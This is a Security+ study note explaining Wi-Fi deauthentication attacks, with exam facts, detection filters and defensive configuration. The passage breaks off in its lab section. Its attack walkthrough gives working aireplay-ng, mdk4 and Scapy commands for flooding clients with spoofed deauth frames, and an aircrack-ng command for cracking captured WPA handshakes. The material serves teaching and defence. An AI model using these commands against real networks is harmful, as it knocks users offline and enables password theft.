---
domain: "wireless security"
tags: [wireless, denial-of-service, 802.11, wifi, attack, deauthentication]
---
# Wireless Deauthentication Attack

A **wireless deauthentication attack** is a type of [[Denial-of-Service (DoS) Attack]] that exploits a fundamental flaw in the [[IEEE 802.11 Wi-Fi Standard]] by sending spoofed **management frames** — specifically deauthentication (deauth) frames — to force wireless clients off a network. Because the original 802.11 specification did not require these frames to be authenticated or encrypted, any attacker within radio range can impersonate an access point and disconnect legitimate users. This attack is commonly used as a precursor to more sophisticated attacks such as [[Evil Twin Attack]] and [[WPA Handshake Capture]].

---

## Overview

The deauthentication attack targets the management plane of the 802.11 protocol, specifically the deauthentication management frame (frame subtype 0x000C). These frames are part of the connection lifecycle in Wi-Fi — when a client wants to cleanly disconnect from an access point, or when an AP needs to terminate a session, a deauthentication frame is sent. In the original 802.11 design, there was no mechanism to verify whether such a frame was genuinely sent by the legitimate AP or client, making it trivially easy to forge.

The attack was first widely documented in the early 2000s and became notorious when tools like `aireplay-ng` (part of the Aircrack-ng suite) were released, automating the process entirely. Attackers use wireless cards capable of packet injection, switched into **monitor mode**, to craft and broadcast these frames to any target on a nearby network. The attack requires no authentication credentials and no prior association with the network — just physical proximity and appropriate hardware.

In real-world scenarios, deauthentication attacks are used for several purposes: as standalone denial-of-service attacks to disrupt network availability, to harvest WPA/WPA2 four-way handshakes for offline password cracking, to force clients to connect to a rogue access point in an [[Evil Twin Attack]], and as a component of [[WPA PMKID Attack]] workflows. They have been used in targeted corporate espionage, disruption of public events, and even as tools in physical security bypass scenarios where wireless-dependent systems (alarm panels, IP cameras) can be knocked offline.

The IEEE responded to this vulnerability with the introduction of **Management Frame Protection (MFP)**, standardized in the **802.11w amendment** (2009) and later incorporated into the **802.11-2012** consolidated standard. 802.11w cryptographically protects unicast management frames including deauthentication and disassociation frames. However, broadcast deauthentication frames remain a challenge, and adoption of 802.11w was historically slow. **WPA3** mandates 802.11w support, making it the most effective long-term mitigation.

Despite the existence of 802.11w for over a decade, the attack remains relevant because a substantial fraction of deployed Wi-Fi infrastructure still runs WPA2 without MFP enabled, and legacy clients that do not support 802.11w can still be targeted even when MFP is configured as optional on the AP.

---

## How It Works

### Protocol Background

The 802.11 MAC layer divides frames into three categories:
- **Management frames** — used for association, authentication, beacons, probes, and deauthentication
- **Control frames** — used for RTS/CTS, ACK
- **Data frames** — carry actual network payload

Deauthentication and disassociation frames are management frames. They contain:
- Source MAC address (spoofed by the attacker)
- Destination MAC address (target client or broadcast `FF:FF:FF:FF:FF:FF`)
- BSSID (the AP's MAC address, also spoofed)
- A **reason code** (2 bytes) explaining why the deauthentication is occurring

Common reason codes used in attacks:
| Code | Meaning |
|------|---------|
| 1    | Unspecified reason |
| 3    | Station is leaving BSS |
| 7    | Class 3 frame received from nonassociated station |

### Attack Steps

**Step 1: Identify Target Network**

The attacker places their wireless interface into monitor mode to passively capture 802.11 traffic and identify the target BSSID and channel.

```bash
# Put interface into monitor mode (replace wlan0 with your interface)
sudo airmon-ng start wlan0

# Scan for nearby networks
sudo airodump-ng wlan0mon
```

Sample output shows BSSID, channel, ESSID (network name), encryption type, and connected clients.

**Step 2: Target a Specific Network and Channel**

```bash
# Lock to the target channel and capture traffic, saving to file
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write capture wlan0mon
```

This also reveals the MAC addresses of clients currently associated with the target AP (shown in the lower section of airodump output under STATION).

**Step 3: Launch the Deauthentication Attack**

```bash
# Send 100 deauth frames to a specific client from the target AP
# -0 = deauth attack, 100 = number of frames, -a = AP BSSID, -c = client MAC
sudo aireplay-ng -0 100 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Broadcast deauth — targets all clients on the AP (more disruptive)
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

The `-0 0` argument sends deauth frames continuously until interrupted with Ctrl+C.

**Step 4: Capture the WPA Handshake (Common Follow-on)**

When the client receives the spoofed deauth, it disconnects and attempts to reconnect automatically. This reconnection triggers the **WPA2 four-way handshake**, which airodump-ng captures. The handshake file can then be fed into password cracking tools:

```bash
# Crack the captured handshake with a wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### Hardware Requirements

Not all wireless cards support **packet injection** (the ability to transmit arbitrary frames). Cards commonly used for this purpose in labs include:
- **Alfa AWUS036ACH** (Realtek RTL8812AU chipset)
- **Alfa AWUS036NHA** (Atheros AR9271 chipset)
- **Panda PAU09** (Ralink RT5572 chipset)

Verify injection capability:
```bash
sudo aireplay-ng --test wlan0mon
```

### Alternative Tools

```bash
# mdk4 — more advanced, supports pattern-based attacks
sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF

# Python with Scapy — programmatic approach
from scapy.all import *

def deauth(target_mac, gateway_mac, iface):
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(frame, iface=iface, count=100, inter=0.1, verbose=1)

deauth("11:22:33:44:55:66", "AA:BB:CC:DD:EE:FF", "wlan0mon")
```

---

## Key Concepts

- **Monitor Mode**: A wireless interface operating mode that allows passive capture of all 802.11 frames in range, regardless of destination MAC address. Required for wireless attack and analysis tools; distinct from promiscuous mode which applies to wired Ethernet.

- **Packet Injection**: The ability of a wireless card and driver to transmit arbitrary, manually crafted 802.11 frames. Not all chipsets support this; it requires driver-level support (e.g., mac80211-based drivers in Linux).

- **Management Frame Protection (MFP / 802.11w)**: An IEEE amendment that adds cryptographic integrity protection (using CCMP) to unicast management frames. When 802.11w is active, a client receiving a deauth frame can verify it was legitimately signed by the AP. Broadcast management frames use an integrity group temporal key (IGTK).

- **BSSID Spoofing**: The act of forging the source MAC address (BSSID) field in an 802.11 frame to impersonate a legitimate access point. Wireless drivers in Linux allow this natively with tools like `macchanger` or through the Aircrack-ng suite.

- **Four-Way Handshake**: The WPA2 key exchange sequence that occurs when a client associates with an AP. It establishes the Pairwise Transient Key (PTK). Forcing a reconnection via deauth captures this handshake, enabling offline dictionary attacks against the network's Pre-Shared Key (PSK).

- **Reason Code**: A two-byte field in deauthentication and disassociation frames specifying why the disconnection is occurring. Defined in the 802.11 standard; attackers typically use codes 1, 3, or 7 as they are common and non-suspicious in isolation.

- **Disassociation vs. Deauthentication**: Both are management frame attacks that disconnect clients, but they operate at different state machine levels. Disassociation moves a client from State 3 (associated) to State 2 (authenticated but not associated), while deauthentication moves it all the way to State 1 (unauthenticated), requiring a full re-authentication.

---

## Exam Relevance

**SY0-701 Domain Mapping**: This attack falls under **Domain 2.0 — Threats, Vulnerabilities, and Mitigations**, specifically the wireless attack subcategory.

**Key exam facts to memorize:**

- Deauthentication attacks are a form of **wireless DoS** and are specifically listed in the CompTIA Security+ exam objectives.
- The exam may present this as a **disassociation attack** — understand both terms refer to similar management frame abuse.
- The primary **mitigation** tested is **802.11w (Management Frame Protection)** — know that WPA3 mandates this.
- **WPA2 is vulnerable**; WPA3 with 802.11w significantly mitigates the attack.
- Deauth attacks are commonly listed as a **precursor to evil twin or credential harvesting attacks** — expect scenario questions where you need to identify the attack chain.

**Common Question Patterns:**

> *"An attacker is forcing wireless clients to disconnect from the corporate AP and reconnect to a rogue access point. What type of attack is being used?"*
> Answer: **Deauthentication attack** (often combined with evil twin).

> *"Which wireless security standard provides protection against management frame spoofing?"*
> Answer: **802.11w / WPA3**

**Gotchas:**
- Do not confuse deauthentication attacks with [[WEP Cracking]] — they are unrelated mechanisms.
- The attack works against **WPA2 and WPA3 networks** unless 802.11w is enforced (not just optional).
- The exam distinguishes between **DoS** (disruption goal) and **deauth as a precursor** — read scenario questions carefully.

---

## Security Implications

### Vulnerabilities

The root vulnerability is the **lack of origin authentication** for 802.11 management frames in the original 802.11 specification. This is a design flaw, not an implementation bug — any device following the standard correctly is vulnerable.

**CVE and Incident Context:**
- While there is no single CVE for the deauthentication flaw itself (it is a protocol design issue), related tooling vulnerabilities have been tracked. For example, certain enterprise APs and wireless controllers have had vulnerabilities in their MFP implementation.
- The attack was publicly demonstrated against 802.11b networks as early as 2003 by various security researchers.
- In 2014, security researchers demonstrated deauthentication attacks against Wi-Fi-dependent home security systems, showing that alarm systems relying on 802.11 could be silenced.
- Large-scale deauth attacks have been used at public events (conferences, stadiums) to disrupt Wi-Fi availability, effectively as a tool for [[Jamming Attack]]-level disruption without requiring RF jamming hardware.

### Attack Chain Context

The deauthentication attack rarely exists in isolation in sophisticated campaigns:

1. **Passive reconnaissance** → identify target BSSID and clients
2. **Deauth attack** → force client disconnection
3. **Handshake capture** → grab WPA2 four-way handshake
4. **Offline cracking** → attack PSK with hashcat/aircrack-ng
5. **OR Evil twin** → redirect client to rogue AP for [[Credential Harvesting]]

### Detection Indicators

- Sudden, repeated disconnection events across multiple wireless clients
- Excessive deauthentication frames in wireless packet captures (detectable via Wireshark filter: `wlan.fc.type_subtype == 0x000c`)
- Wireless IDS/IPS alerts on management frame anomalies
- Client devices reporting frequent "authentication timeout" or "reason code 3" disconnections in system logs

---

## Defensive Measures

### 1. Enable 802.11w (Management Frame Protection)

Configure MFP on all access points. On most enterprise systems:

- **Required** mode (not just optional) prevents all 802.11w-capable clients from being deauthenticated by spoofed frames
- **Cisco WLC**: Navigate to WLAN > Security > 802.11w and set to "Required" for sensitive networks
- **Ubiquiti UniFi**: Settings → WiFi → Advanced → Enable "PMF" (Protected Management Frames) and set to "Required"
- **hostapd (Linux AP)**:
```
ieee80211w=2
# 0=disabled, 1=optional, 2=required
wpa_key_mgmt=WPA-PSK-SHA256
rsn_pairwise=CCMP
```

### 2. Upgrade to WPA3

WPA3-Personal (SAE) mandates 802.11w support. Migrate infrastructure to WPA3 where hardware supports it. WPA3-Enterprise provides additional protections with 192-bit cryptographic suites.

### 3. Deploy a Wireless Intrusion Prevention System (WIPS)

Enterprise solutions such as **Cisco Adaptive Wireless IPS**, **Aruba RFProtect**, or open-source **Kismet** with alerting rules can detect anomalous deauth frame floods and generate alerts or automatically countermeasure rogue APs.

```bash
# Kismet — detect deauth floods
# In kismet.conf, enable the alert:
alert=DEAUTHFLOOD,5/min,10/5min
```

### 4. Use 802.1X / EAP Authentication (Enterprise Networks)

In enterprise environments, deploying **WPA2/WPA3-Enterprise** with **802.1X** and a **RADIUS server** reduces the impact. Even if a client is deauthenticated, without valid credentials and certificates the client cannot authenticate to an evil twin AP. Combined with [[Certificate-Based Authentication]], this is highly effective.

### 5. Client-Side Controls

- Configure devices to only connect to known SSIDs with **specific BSSID pinning** where supported
- Deploy **endpoint security agents** that detect sudden wireless disconnections and alert users
- Educate users not to re-enter credentials on unexpected authentication prompts following sudden disconnections

### 6. Monitor with Wireshark / tshark

```bash
# Capture and filter for deauth frames on a monitor-mode interface
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x000c" -T fields \
  -e wlan.sa -e wlan.da -e wlan.bssid -e wlan_mgt.fixed.reason_code
```

---

## Lab / Hands-On

> ⚠️ **Legal Warning**: Only perform wireless attacks against networks and devices you own or have explicit written authorization to test. Deauthentication attacks against production networks may violate the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act (UK), and equivalent laws globally.

### Lab Setup

**Recommended environment:**
- A